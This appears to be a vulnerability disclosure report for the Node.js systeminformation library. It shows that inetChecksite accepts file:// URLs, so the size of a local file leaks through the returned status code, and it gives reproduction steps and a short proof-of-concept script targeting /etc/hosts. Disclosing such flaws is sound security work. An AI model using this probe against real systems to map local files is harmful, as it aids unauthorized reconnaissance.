# :dizzy: Description:
- Systeminformation Is a System Information Library for Node.JS. And It's Vulnerable To Local File Sizes Disclosure Via `inetChecksite` Function Due To Lack Of File Scheme Validation On The cURL Command. That Allows Attackers With Controlled Inputs To Disclose Files That Exists On The Local Server And It's Sizes By Detecting The Status Code That's Detected By Basic cURL Command Results.

# :ok_hand: Steps To Reproduce:
- Create New Nodejs Project Then Install systeminformation Using `npm install systeminformation`
- Create `main.js` Then Include This Code On It:

```javascript
var systemInformation = require('systeminformation');
systemInformation.inetChecksite('file:///etc/hosts').then(data => console.log(data));
```
- Run The Program Using: `node main.js` Then See The Output Status Code. It Will Be `/etc/hosts` File Size
- Use This Command: `ls -l /etc/hosts` To Get The `/etc/hosts` Size Then You Will Get That They're The Same

# :boom: Proof Of Concept:
- Here I Wrote a Simple Proof Of Concept Code That Proves That The Status Code is The Same as The fileSize On The Local System.

```javascript
var systemInformation = require('systeminformation');
var { exec } = require('child_process');

console.log("systemInformation Results:");
exec('ls -l /etc/hosts' , function(error , out) {
    if (error) {
        throw error;
    }

    console.log(out);
})
systemInformation.inetChecksite('file:///etc/hosts').then(data => console.log(data));
```
